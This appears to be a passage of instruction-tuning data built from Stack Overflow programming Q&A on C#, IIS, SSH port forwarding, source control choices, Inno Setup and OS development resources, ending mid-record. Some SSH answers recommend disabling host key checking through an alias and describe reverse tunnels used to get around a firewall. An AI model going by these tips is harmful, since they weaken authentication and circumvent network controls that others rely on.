{"instruction": "I'm wanting to parse a string into a nullable int in C#.  ie. I want to get back either the int value of the string or null if it can't be parsed.\nI was kind of hoping that this would work\nint? val = stringVal as int?;\n\nBut that won't work, so the way I'm doing it now is I've written this extension method\npublic static int? ParseNullableInt(this string value)\n{\n\tif (value == null || value.Trim() == string.Empty)\n\t{\n\t\treturn null;\n\t}\n\telse\n\t{\n\t\ttry\n\t\t{\n\t\t\treturn int.Parse(value);\n\t\t}\n\t\tcatch\n\t\t{\n\t\t\treturn null;\n\t\t}\n\t}\n}\n\nIs there a better way of doing this?\nEDIT:  Thanks for the TryParse suggestions, I did know about that, but it worked out about the same.  I'm more interested in knowing if there is a built-in framework method that will parse directly into a nullable int?", "output": "You can do this in one line, using the conditional operator and the fact that you can cast null to a nullable type (two lines, if you don't have a pre-existing int you can reuse for the output of TryParse):\nint tempVal;\nint? val = Int32.TryParse(stringVal, out tempVal) ? tempVal : (int?)null;"}
{"instruction": "What can be reasons to prevent a class from being inherited? (e.g. using sealed on a c# class)\nRight now I can't think of any.", "output": "From an object-oriented perspective, sealing a class clearly documents the author's intent without the need for comments.  When I seal a class I am trying to say that this class was designed to encapsulate some specific piece of knowledge or some specific service.  It was not meant to be enhanced or subclassed further.\nThis goes well with the Template Method design pattern.  I have an interface that says \"I perform this service.\"  I then have a class that implements that interface.  But, what if performing that service relies on context that the base class doesn't know about (and shouldn't know about)?  What happens is that the base class provides virtual methods, which are either protected or private, and these virtual methods are the hooks for subclasses to provide the piece of information or action that the base class does not know and cannot know.  Meanwhile, the base class can contain code that is common for all the child classes.  These subclasses would be sealed because they are meant to accomplish that one and only one concrete implementation of the service.\nCan you make the argument that these subclasses should be further subclassed to enhance them?  I would say no because if that subclass couldn't get the job done in the first place then it should never have derived from the base class.  If you don't like it then you have the original interface, go write your own implementation class.\nSealing these subclasses also discourages deep levels of inheritence, which works well for GUI frameworks but works poorly for business logic layers."}
{"instruction": "I'm writing up some productivity/metrics tools for myself to help monitor my focus throughout the day. Recently, I've noticed that I tend to get off track more than usual and feel the need to get up and go for walks/drinks/etc and I'm concerned that I'm \"wasting\" too much time.\nSince I always lock my computer when I go anywhere, and I unlock it as soon as I return (even if I'm just reading at my desk, etc), I was wondering how I can determine, in code, how long the machine is locked.\nI'm writing this in C# if that helps, but I'm open to other ideas.\n\nI like the windows service idea (and have accepted it) for simplicity and cleanliness, but unfortunately I don't think it will work for me in this particular case. I wanted to run this on my workstation at work rather than home (or in addition to home, I suppose), but it's locked down pretty hard courtesy of the DoD. That's part of the reason I'm rolling my own, actually.\nI'll write it up anyway and see if it works. Thanks everyone!", "output": "I would create a Windows Service (a visual studio 2005 project type) that handles the OnSessionChange event as shown below:\n    protected override void OnSessionChange(SessionChangeDescription changeDescription)\n    {\n        if (changeDescription.Reason == SessionChangeReason.SessionLock)\n        { \n            //I left my desk\n        }\n        else if (changeDescription.Reason == SessionChangeReason.SessionUnlock)\n        { \n            //I returned to my desk\n        }\n    }\n\nWhat and how you log the activity at that point is up to you, but a Windows Service provides quick and easy access to windows events like startup, shutdown, login/out, along with the lock and unlock events."}
{"instruction": "I ran into an issue with an IIS web app shutting down an idle worker process.  The next request would then have to re-initialize the application, leading to delays.  I disabled the IIS shutdown of idle worker processes on the application pool to resolve this.  Are there any issues associated with turning this off?  If the process is leaking memory, I imagine it is nice to recycle the process every now and then.  Are there any other benefits to having this process shutdown?", "output": "I'm assuming that you're referring to IIS 6.\nInstead of disabling shutdown altogether, maybe you can just increase the amount of time it waits before killing the process.  The server is essentially conserving resources - if your server can stand the resource allocation for a process that mostly sits around doing nothing, then there isn't any harm in letting it be.\nAs you mentioned, setting the auto-recycling of the process on a memory limit would be a good idea, if the possibility of a memory leak is there."}
{"instruction": "I have a small local network. Only one of the machines is available to the outside world (this is not easily changeable). I'd like to be able to set it up such that ssh requests that don't come in on the standard port go to another machine. Is this possible? If so, how?\nOh and all of these machines are running either Ubuntu or OS X.", "output": "You can use Port Fowarding to do this. Take a look here:\nhttp://portforward.com/help/portforwarding.htm\nThere are instructions on how to set up your router to port forward request on this page:\nhttp://www.portforward.com/english/routers/port_forwarding/routerindex.htm"}
{"instruction": "I have a small local network. Only one of the machines is available to the outside world (this is not easily changeable). I'd like to be able to set it up such that ssh requests that don't come in on the standard port go to another machine. Is this possible? If so, how?\nOh and all of these machines are running either Ubuntu or OS X.", "output": "Another way to go would be to use ssh tunneling (which happens on the client side).\nYou'd do an ssh command like this:\nssh -L 8022:myinsideserver:22 paul@myoutsideserver\n\nThat connects you to the machine that's accessible from the outside (myoutsideserver) and creates a tunnel through that ssh connection to port 22 (the standard ssh port) on the server that's only accessible from the inside.\nThen you'd do another ssh command like this (leaving the first one still connected):\nssh -p 8022 paul@localhost\n\nThat connection to port 8022 on your localhost will then get tunneled through the first ssh connection taking you over myinsideserver.\n\nThere may be something you have to do on myoutsideserver to allow forwarding of the ssh port.  I'm double-checking that now.\nEdit\nHmmm.  The ssh manpage says this:  **Only the superuser can forward privileged ports.  **\nThat sort of implies to me that the first ssh connection has to be as root.  Maybe somebody else can clarify that.\nIt looks like superuser privileges aren't required as long as the forwarded port (in this case, 8022) isn't a privileged port (like 22).  Thanks for the clarification Mike Stone."}
{"instruction": "I have a small local network. Only one of the machines is available to the outside world (this is not easily changeable). I'd like to be able to set it up such that ssh requests that don't come in on the standard port go to another machine. Is this possible? If so, how?\nOh and all of these machines are running either Ubuntu or OS X.", "output": "@Mark Biek\nI was going to say that, but you beat me to it!  Anyways, I just wanted to add that there is also the -R option:\nssh -R 8022:myinsideserver:22 paul@myoutsideserver\n\nThe difference is what machine you are connecting to/from.  My boss showed me this trick not too long ago, and it is definitely really nice to know... we were behind a firewall and needed to give external access to a machine... he got around it by ssh -R to another machine that was accessible... then connections to that machine were forwarded into the machine behind the firewall, so you need to use -R or -L based on which machine you are on and which you are ssh-ing to.\nAlso, I'm pretty sure you are fine to use a regular user as long as the port you are forwarding (in this case the 8022 port) is not below the restricted range (which I think is 1024, but I could be mistaken), because those are the \"reserved\" ports.  It doesn't matter that you are forwarding it to a \"restricted\" port because that port is not being opened (the machine is just having traffic sent to it through the tunnel, it has no knowledge of the tunnel), the 8022 port IS being open and so is restricted as such.\nEDIT: Just remember, the tunnel is only open so long as the initial ssh remains open, so if it times out or you exit it, the tunnel will be closed."}
{"instruction": "For me a multistage environment contains environments for development, testing, quality assurance, maybe a client review stage and finally production. It should allow easy collaboration between developers, project status tracking and easy deployment of the application to any stage for a specific version. \nYou can propose specific tools for specific application types but I think the question is general enough. Is there any software package ready to use out of the box?", "output": "You can use anything that works.\nEven CVS ( and I speak from experience there)\nYou just need to bolt on some SCM like SCMBug and you're good to go.\nSCMBug works with a number of VCS solutions."}
{"instruction": "For me a multistage environment contains environments for development, testing, quality assurance, maybe a client review stage and finally production. It should allow easy collaboration between developers, project status tracking and easy deployment of the application to any stage for a specific version. \nYou can propose specific tools for specific application types but I think the question is general enough. Is there any software package ready to use out of the box?", "output": "We use CruiseControl.NET to automatically push source control checkins out to a dev server. This allows people to regression test their changes in real time.\nWe then use a series of scripts to robocopy the build to other environments. \nFor Example:\n\nDeveloper completes a change and checks into source control\nCruiseControl detects the change and builds the new code and drops into Dev.\nDeveloper is able to test the change in a enviroment that mirrors production.\nThis repeats until all changes are done and tested. \nA script is ran that copies Dev to Test.\nDev is now frozen while business owners UAT on the Test enviroment. If a defect is found, it is fixed in dev and then promoted back to Test.\nOnce UAT passes, a script is ran that copies the build to the final production farm.\nAt this point, developers are free to push code back to Dev for the next round of work."}
{"instruction": "I have a small local network. Only one of the machines is available to the outside world (this is not easily changeable). I'd like to be able to set it up such that ssh requests that don't come in on the standard port go to another machine. Is this possible? If so, how?\nOh and all of these machines are running either Ubuntu or OS X.", "output": "(In this example, I am assuming port 2222 will go to your internal host.  $externalip and $internalip are the ip addresses or hostnames of the visible and internal machine, respectively.)\nYou have a couple of options, depending on how permanent you want the proxying to be:\n\nSome sort of TCP proxy.  On Linux, the basic idea is that before the incoming packet is processed, you want to change its destination\u2014i.e. prerouting destination NAT:\niptables -t nat -A PREROUTING -p tcp -i eth0 -d $externalip --dport 2222 --sport \n1024:65535 -j DNAT --to $internalip:22\nUsing SSH to establish temporary port forwarding.  From here, you have two options again:\n\nTransparent proxy, where the client thinks that your visible host (on port 2222) is just a normal SSH server and doesn't realize that it is passing through.  While you lose some fine-grained control, you get convenience (especially if you want to use SSH to forward VNC or X11 all the way to the inner host).\n\nFrom the internal machine: ssh -g -R 2222:localhost:22 $externalip\nThen from the outside world: ssh -p 2222 $externalip\n\nNotice that the \"internal\" and \"external\" machines do not have to be on the same LAN.  You can port forward all the way around the world this way.\nForcing login to the external machine first.  This is true \"forwarding,\" not \"proxying\"; but the basic idea is this: You force people to log in to the external machine (so you control on who can log in and when, and you get logs of the activity), and from there they can SSH through to the inside.  It sounds like a chore, but if you set up simple shell scripts on the external machine with the names of your internal hosts, coupled with password-less SSH keypairs then it is very straightforward for a user to log in.  So:\n\nOn the external machine, you make a simple script, /usr/local/bin/internalhost which simply runs ssh $internalip\nFrom the outside world, users do: ssh $externalip internalhost and once they log in to the first machine, they are immediately forwarded through to the internal one.\n\nAnother advantage to this approach is that people don't get key management problems, since running two SSH services on one IP address will make the SSH client angry.\n\n\nFYI, if you want to SSH to a server and you do not want to worry about keys, do this\nssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no\n\nI have an alias in my shell called \"nossh\", so I can just do nossh somehost and it will ignore all key errors.  Just understand that you are ignoring security information when you do this, so there is a theoretical risk.\nMuch of this information is from a talk I gave at Barcamp Bangkok all about fancy SSH tricks.  You can see my slides, but I recommend the text version as the S5 slides are kind of buggy.  Check out the section called \"Forward Anything: Simple Port Forwarding\" for info.  There is also information on creating a SOCKS5 proxy with OpenSSH.  Yes, you can do that.  OpenSSH is awesome like that.\n(Finally, if you are doing a lot of traversing into the internal network, consider setting up a VPN.  It sounds scary, but OpenVPN is quite simple and runs on all OSes.  I would say it's overkill just for SSH; but once you start port-forwarding through your port-forwards to get VNC, HTTP, or other stuff happening; or if you have lots of internal hosts to worry about, it can be simpler and more maintainable.)"}
{"instruction": "I have a small local network. Only one of the machines is available to the outside world (this is not easily changeable). I'd like to be able to set it up such that ssh requests that don't come in on the standard port go to another machine. Is this possible? If so, how?\nOh and all of these machines are running either Ubuntu or OS X.", "output": "In Ubuntu, you can install Firestarter and then use it's Forward Service feature to forward the SSH traffic from a non standard port on your machine with external access to port 22 on the machine inside your network.\nOn OS X you can edit the /etc/nat/natd.plist file to enable port fowarding."}
{"instruction": "Python frameworks always provide ways to handle URLs that convey the data of the request in an elegant way, like for example http://somewhere.overtherainbow.com/userid/123424/\nI want you to notice the ending path /userid/123424/\nHow do you do this in ASP.NET?", "output": "Also, check out ASP.NET MVC or if you're set on webforms, the new System.Web.Routing namespace in ASP.NET 3.5 SP1"}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "Sourcegear's Vault is a great option, it runs on SqlServer and it has been around for many years. I would not use any version of VSS (Visual Source Safe)."}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "I dont see why the fact that your one developer changes anything on the source control issue. I would follow the same system (in fact I do on my solo projects).  I use wush.net (svn and trac) in those cases. It's fast to set up and dont require that you yourself do or know any server issues. I recommend you use something like this."}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "I would definitely recommend git\nWorks great for both big and small teams. Only drawback is poor native windows support. Although it works fine for me in Cygwin. There also exists a native windows port.\nSome of its benefits:\n\nExcellent support for a non-linear work flow. Its branching and merging is far better than eg Subversion.\nGood tools to navigate your repository\nHandles large projects well.\nIt is not possible to modify the history without changing the cryptographic signature of your repository\nWith its non monolithic design, it is easy to script.\n\nSome people find that it has a steep learning curve. But once you understand it you can do almost anything you would want with it."}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "I use Mercurial.  It runs a treat running stand alone on my Vista development system with no other dependencies required.  I use the command line but there's also TortoiseHG to integrate with Explorer.\nTwo comments:\n\nThere are other tools which probably integrate with VS better.  I think Subversion has nice VS plug ins.\nThe benefit of a separate server is that it's a nice backup of all your work in case your HDD dies on you etc. so discount having one.\n\nEdit: @Slartibartfast - if you just want to run source code control on a single machine a Distributed Source Code Control tool like git or Mercurial is ideal since they're designed to run complete repositories on a machine without the overhead of a server.  The fact that you never connect your repository to anyone else's to push and pull changes doesn't mean that tool won't be right."}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "G'day,\nI'll ask an obvious question here.\nWhat system, if any, does the customer use?\nYou don't want to complicate things going from SVN or CVS to Clearcase, for example.\ncheers,\nRob"}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "Well, for start, you don't need distributed one :)\nI'm not sure what this physical part means, because you could put svn server on your own machine in little trouble. \nOn the other hand, NetBeans have local history module that logs all local changes of a file. Maybe something like that would be enough for you if Visual Studio have something similar."}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "A source control system doesn't care if there's only one developer involved :)\nI would recommend that you use a source control system that you've used before and liked.\nIf you like vs 2008 integration of the source control system however I would go with  TFS although I never had the experience to set it up but it shouldn't be so hard.\nAnother possibility is to use svn (you'll find some servers on google) and use Tortoisesvn that integrates into the windows shell and is nice to work with."}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "You can use  Vault from SourceGear, the replacement tool for visual studio source safe.\nThe IDE is integrated in Visual Studio.\nThe tool is free for single user.\nMore information:  http://www.sourcegear.com/vault/index.html"}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "Go for subversion and tortoiseSVN, you don't need to set it up on a server. \n\nCosts are zero\nThe subversion documentation is great and fun to read\ntortoiseSVN is a very convenient client"}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "Subversion has very low barrier to entry.\nTortoiseSVN is a free client, and integrates into your explorer- i.e. in right mouse click menu.\nThe repository can be just a directory somewhere on your PC or on a network drive. Backing up just means zipping up this directory \nThere are a few plugins to Visual studio for Subversion, AnkSvn is one I have used, it is free and integrates nicely (i.e it will be smart about moving and deleting files etc)\nSubversion is a good choice for one developer.\nUpdate:\nSince this post, I've been using Mercurial. It is a Distributed SVN. The 'distributed' aspect may not be directly useful to a sole developer, however it is better at merging and is somewhat faster. There is also a free and good Windows Explorer extension client -  Tortoise Hg.\nSo in summary, if you are the sort of person who will work on many branches at once (doing spikes etc) or if you work on multiple PCs at once and would like full offline access to checkin history on both, then Mercurial. If you just want simple tracking and a well proven and easy to understand solution, then Subversion."}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "I would use Subversion (in fact I use it) [update: Jul 2014 -- I use Git -- see end of the answer].\nSVN is:\n\nfree,  \ngood enough (see disadvantages below),  \nsimple,  \nworks fine on Windows (and Linux too), \na lot of people use it so it's easy to get help, \ncan integrate with most of IDEs i.e. Visual Studio (i.e. ankhsvn or VisualSVN -- more info) or Eclipse (i.e. Subclipse -- here someone asked about that).\n\nI would strongly recommended separate machine to source control server. At best somewhere on the cloud. Advantages:\n\nYou don't lost your source control repositories if your development box dies.\nYou don't have to worry about maintenance of one more box.\n\nThere are companies which host SVN repositories.\nHere are links to SVN (client and server) packages for various operating systems.\nDisadvantages of SVN\nI am using SVN on Windows machine for about 5 years and found that SVN has a few disadvantages :).\nIt is slow on large repositories\nSVN (or its client -- TortoiseSVN) has one big disadvantage -- it terrible slow (while updating or committing) on large (thousands of files) repositories unless you have SSD drive.\nMerging can be difficult\nMany people complain about how hard merging is with SVN.\nI do merging for about 4 years (including about 2 years in CVS -- that was terrible, but doable) and about 2 years with SVN.\nAnd personally I don't find it hard -- on the other hand -- any merge is easy after merging branches in CVS :).\nI do merge of large repository (two repositories in fact) once a week and rarely I have conflicts which are hard to solve (most of conflicts are solved automatically with diff software which I use).\nHowever in case of project of a few developers merging should not be problem at all if you keep a few simple rules:\n\nmerge changes often,\navoid active development in various branches simultaneously.\n\nAdded in July 2011\nMany devs recommended Distributed Version Control like Git or Mercurial.\nFrom single developer perspective there are only a few important advantages of DVCS over SVN:\n\nDVCS can be faster.\nYou can commit to local repository without access to central one.\nDVCS is hot thing and fancy to use/learn (if someone pay for your learning).\n\nAnd I don't think merging is a problem in case of single developer.\nJoel Spolsky wrote tutorial about Mercurial which is definitively worth to read.\nSo, despite of many advantages of DVCS I would stay with SVN if merging or speed is not a problem.\nOr try Mercurial, which according to this and this SO questions, is better supported (in July 2011) on Windows.\nAdded in July 2014\nFor about a year I use Git (Git Bash mainly) for my pet-projects (i.e. solving Euler problems) and local branches for each Euler problem are really nice feature -- exactly as it is described as advantage of DVCS. \nToday Git tooling on Windows is much, much better then 2 or more years ago.\nYou can use remote repo (like GitHub or ProjectLocker and many others) to keep \ncopy of your project away from your workstation with no extra effort/money.\nHowever I use GUI client only to looks at diffs (and sometimes to choose files to commit),\nso it's better to not afraid of command line -- it's really nice.\nSo as of today I would go with Git."}
{"instruction": "Can you suggest some good MVC framework for perl -- one I am aware of is catalyst\nThe need is to be able to expose services on the perl infrastructure which can be called by Java/.Net applications seamlessly.", "output": "I'll tell you right now that Catalyst has by far the best reputation amongst Perl developers in terms of a rapid application development MVC framework. \nIn terms of \"pure\" MVC I'm not sure there are even that many \"mature\" or at least production-ready alternatives.\nIf Catalyst doesn't seem right to you, then you could build upon the lightweight framework CGI::Application to suit your needs or take a look at some of the lesser known MVC frameworks like PageKit and Maypole."}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "I'd recommend two things:\nFirst up, that other server - what happens if your machine dies? the house burns down? etc. Having it on another machine is a good idea from a redundancy point of view.\nThe second one is WHAT:\nIf you are very familiar with visual source(un)safe, think about SourceGearVault. It's VERY nice, very fast, and very much a vastly improved \"clone\" of VSS (ie works the same way from the users POV, not under the hood). Needs SQL server and windows tho (it's .NET + SQL server). Free for 1 user.\nOf you are not, then I suggest you do one of two things:\nFirst, get VisualSVN. It's great, works with VS2008 really well.\nSecond, if you MUST run it locally, get VisualSVN server (free!). Make sure you have a good backup plan. Runs on XP/2003/2008/Vista etc.It's just Apache + SVN, under the hood, so it just saves you on the setup - took me 5 mins to install and have it running.\nOR, and I prefer this one:\ngo somewhere like Unfuddle, Dreamhost etc, and get hosting for SVN. It's private, it's fast, and most of all - it's OFFSITE. My dreamhsot account, with something crazy like 500GB of storage and 1-2TB of transfer/month costs about $6/month! There are others which do SVN hosting + bug tracking etc. Look around.\nBut yeah - SVN is the schizzzznit.you could create a local repository, but I like having a remote, backed up server.\nTFS is total, utter overkill for 1 developer (or <5 IMO)"}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "I would also recommend Mercurial. It's command set is much like the one found in Subversion, so the learning curve is not that steep. As mentioned earlier, it's designed to run locally, but it's also easy to share/merge changes across computers, or even just push it to a remote server for backups.\nIt offers excellent tools, like TortoiseHG, and it has good plugins for NetBeans and Eclipse. It also runs natively on Win32, as it's written in Python.\nIf you don't want to set up a server yourself (for backups, e.g.), there are free hosting providers available; there's a comprehensive list on The Mercurial Wiki."}
{"instruction": "I want to call a function from a .NET DLL (coded in C#) from an Inno Setup script.\nI have:\n\nmarked the Register for COM interop option in the project properties,\nchanged the ComVisible setting in the AssemblyInfo.cs file,\nadded these lines to the ISS script:\n\n\n[Files]\nSource: c:\\temp\\1\\MyDLL.dll; Flags: dontcopy\n[Code]\nfunction MyFunction(): string;\nexternal 'MyFunction@files:MyDLL.dll stdcall setuponly';\n\nbut I still get the following error:\n\nRuntime Error (at -1:0):\nCannot Import dll:C:\\DOCUME~1\\foo\\LOCALS~1\\Temp\\is-LRL3E.tmp\\MyDLL.dll.\n\nWhat am I doing wrong?", "output": "You're trying to import a C-style function from your .NET dll - this doesn't really have anything to do with COM interop. COM interop allows you to activate your .NET objects as COM objects, it doesn't expose them as C/C++ exported functions/types.\nIf your function doesn't need to return any data, why not make a simple .exe that calls your function and just run that from your setup?\nAlso: See the innosetup support newsgroups where you might get better support."}
{"instruction": "I'm wanting to parse a string into a nullable int in C#.  ie. I want to get back either the int value of the string or null if it can't be parsed.\nI was kind of hoping that this would work\nint? val = stringVal as int?;\n\nBut that won't work, so the way I'm doing it now is I've written this extension method\npublic static int? ParseNullableInt(this string value)\n{\n\tif (value == null || value.Trim() == string.Empty)\n\t{\n\t\treturn null;\n\t}\n\telse\n\t{\n\t\ttry\n\t\t{\n\t\t\treturn int.Parse(value);\n\t\t}\n\t\tcatch\n\t\t{\n\t\t\treturn null;\n\t\t}\n\t}\n}\n\nIs there a better way of doing this?\nEDIT:  Thanks for the TryParse suggestions, I did know about that, but it worked out about the same.  I'm more interested in knowing if there is a built-in framework method that will parse directly into a nullable int?", "output": "You should never use an exception if you don't have to - the overhead is horrible.\nThe variations on TryParse solve the problem - if you want to get creative (to make your code look more elegant) you could probably do something with an extension method in 3.5 but the code would be more or less the same."}
{"instruction": "I want to call a function from a .NET DLL (coded in C#) from an Inno Setup script.\nI have:\n\nmarked the Register for COM interop option in the project properties,\nchanged the ComVisible setting in the AssemblyInfo.cs file,\nadded these lines to the ISS script:\n\n\n[Files]\nSource: c:\\temp\\1\\MyDLL.dll; Flags: dontcopy\n[Code]\nfunction MyFunction(): string;\nexternal 'MyFunction@files:MyDLL.dll stdcall setuponly';\n\nbut I still get the following error:\n\nRuntime Error (at -1:0):\nCannot Import dll:C:\\DOCUME~1\\foo\\LOCALS~1\\Temp\\is-LRL3E.tmp\\MyDLL.dll.\n\nWhat am I doing wrong?", "output": "Oops, my bad, it's been too long since I've read pascal! So, if you need to get the value then there are a couple of possibilities:\n\nWrite the functionality in C/C++ and export the function, that's definitely supported.\nUse a Managed C++ dll to shim to your .NET dll, and expose the call as a C interface point (this should work, but it's getting messy)\nUse an .exe to store the result of your code in a .INI file or the registry or in a temp file and read the result in the setup code section (this is now properly nasty)\n\nWhen I last worked with InnoSetup it didn't support your scenario directly (calling .NET code from setup)."}
{"instruction": "If possible I want to catch pressure sensitive input from a Wacom tablet in Python. Are there any Python libraries available that can do this?", "output": "You could perhaps take a look at the software described here. It is a gnome applet, written in Python.\nFrom the web site:\n\"The gnome wacom applet is a small gnome panel applet that shows how much pressure is being applied to your wacom tablet by the current device. Clicking on the panel icon brings up a dialog allowing you to select a different device and check what pressure and tilt information is being recieved from it. This dialog also contains a small drawing test area to give your pen a quick test.\"\nGoogle is your friend"}
{"instruction": "I want to call a function from a .NET DLL (coded in C#) from an Inno Setup script.\nI have:\n\nmarked the Register for COM interop option in the project properties,\nchanged the ComVisible setting in the AssemblyInfo.cs file,\nadded these lines to the ISS script:\n\n\n[Files]\nSource: c:\\temp\\1\\MyDLL.dll; Flags: dontcopy\n[Code]\nfunction MyFunction(): string;\nexternal 'MyFunction@files:MyDLL.dll stdcall setuponly';\n\nbut I still get the following error:\n\nRuntime Error (at -1:0):\nCannot Import dll:C:\\DOCUME~1\\foo\\LOCALS~1\\Temp\\is-LRL3E.tmp\\MyDLL.dll.\n\nWhat am I doing wrong?", "output": "I read a little bit more about it - now I can see the difference between importing a C-style function and creating an OLE object.\nSomething like this would work for me:\n[Code]\nprocedure MyFunction();\nvar\n  oleObject: Variant;\nbegin\n  oleObject := CreateOleObject('MyDLL.MyDLL');\n\n  MsgBox(oleObject.MyFunction, mbInformation, mb_Ok);\nend;\n\nbut it requires registering the DLL file.\nI guess I will have to create a command-line application to call the functions from the DLL."}
{"instruction": "I've been playing around with the ASP.NET MVC Framework and the one thing that's really confusing me is how I'm meant to do server side validation of posted form data.  I presume I don't post back to the same URL, but if I don't, how do I redisplay the form with the entered data and error messages?  Also, where should the validation logic go?  In the model or the controller?  This seems to be one of the few areas where web forms are much stronger (I miss the validation controls).", "output": "You might want to take a look at ScottGu's latest post for ASP.Net prev 5. It walks through a validation sample that is very interesting:\nhttp://weblogs.asp.net/scottgu/archive/2008/09/02/asp-net-mvc-preview-5-and-form-posting-scenarios.aspx"}
{"instruction": "Many times I have seen Visual Studio solutions which have multiple projects that share source files.  These common source files are usually out in a common directory and in the solution explorer their icon shows up with a link arrow in the bottom left.\nHowever, any time I try to add a source file to the project that is outside of that project's main directory, it just automatically copies it into the directory so that I no longer have  a shared copy.\nI found that I can get around this by manually opening the project file in a text editor and modifying the path to something like \"../../../Common/Source.cs\"  but this is more of a hack then I would like.\nIs there a setting or something I can change that will allow me to do this from within the IDE?", "output": "Right click on a project, select Add->Existing Item->Add as link (press on small arrow on Add button)"}
{"instruction": "Many times I have seen Visual Studio solutions which have multiple projects that share source files.  These common source files are usually out in a common directory and in the solution explorer their icon shows up with a link arrow in the bottom left.\nHowever, any time I try to add a source file to the project that is outside of that project's main directory, it just automatically copies it into the directory so that I no longer have  a shared copy.\nI found that I can get around this by manually opening the project file in a text editor and modifying the path to something like \"../../../Common/Source.cs\"  but this is more of a hack then I would like.\nIs there a setting or something I can change that will allow me to do this from within the IDE?", "output": "Thanks @aku!\nI knew this could be done, but I didn't know how to do this from Visual Studio. It shows up as a shortcut to the file and the csproj file generates the resulting XML like this:\n<Compile Include=\"..\\CommonAssemblyInfo.cs\">\n  <Link>CommonAssemblyInfo.cs</Link>\n</Compile>\n\nI've seen this technique commonly used for common AssemblyInfo files to keep a consistent version."}
{"instruction": "Can you suggest some good MVC framework for perl -- one I am aware of is catalyst\nThe need is to be able to expose services on the perl infrastructure which can be called by Java/.Net applications seamlessly.", "output": "Catalyst is the way to go. There is also Jifty, but (last time I looked), it had terrible documentation."}
{"instruction": "One thing I've always wanted to do is develop my very own operating system (not necessarily fancy like Linux or Windows, but better than a simple boot loader which I've already done).\nI'm having a hard time finding resources/guides that take you past writing a simple \"Hello World\" OS.  \nI know lots of people will probably recommend I look at Linux or BSD; but the code base for systems like that is (presumably) so big that I wouldn't know where to start.\nAny suggestions?\nUpdate: To make it easier for people who land on this post through Google here are some OS development resources:\n\nWriting Your Own Operating System (Thanks Adam)\nLinux From Scratch (Thanks John)\nSharpOS (C# Operating System) (Thanks lomaxx)\nMinix3 and Minix2 (Thanks Mike)\nOS Dev Wiki and Forums (Thanks Steve)\nBonaFide (Thanks Steve)\nBran (Thanks Steve)\nRoll your own toy UNIX-clone OS (Thanks Steve)\nBroken Thorn OS Development Series\n\nOther resources:\nI found a nice resource named MikeOS, \"MikeOS is a learning tool to demonstrate how simple OSes work. It uses 16-bit real mode for BIOS access, so that it doesn't need complex drivers\"\nUpdated 11/14/08 \nI found some resources at Freebyte's Guide to...Free and non-free Operating Systems that links to kits such as OSKit and ExOS library.  These seem super useful in getting started in OS development.\nUpdated 2/23/09\nRic Tokyo recommended nanoos in this question.  Nanoos is an OS written in C++.\nUpdated 3/9/09\nDinah provided some useful Stack Overflow discussion of aspiring OS developers: Roadblocks in creating a custom operating system discusses what pitfalls you might encounter while developing an OS\nand OS Development is a more general discussion.\nUpdated 7/9/09\nLB provided a link to the Pintos Project, an education OS designed for students learning OS development.\nUpdated 7/27/09 (Still going strong!)\nI stumbled upon an online OS course from Berkley featuring 23 lectures.\nTomOS is a fork of MikeOS that includes a little memory manager and mouse support. As MikeOS, it is designed to be an educational project.  It is written in NASM assembler.\nUpdated 8/4/09\nI found the slides and other materials to go along with the online Berkeley lectures listed above. \nUpdated 8/23/09\nAll questions tagged osdev on stackoverflow\nOS/161 is an academic OS written in c that runs on a simulated hardware.  This OS is similar in Nachos.  Thanks Novelocrat!\ntangurena recommends http://en.wikipedia.org/wiki/MicroC/OS-II, an OS designed for embedded systems.  There is a companion book as well.\nLinux Kernel Development by Robert Love is suggested by Anders.  It is a \"widely acclaimed insider's look at the Linux kernel.\"\nUpdated 9/18/2009\nThanks Tim S. Van Haren for telling us about Cosmos, an OS written entirely in c#.\ntgiphil 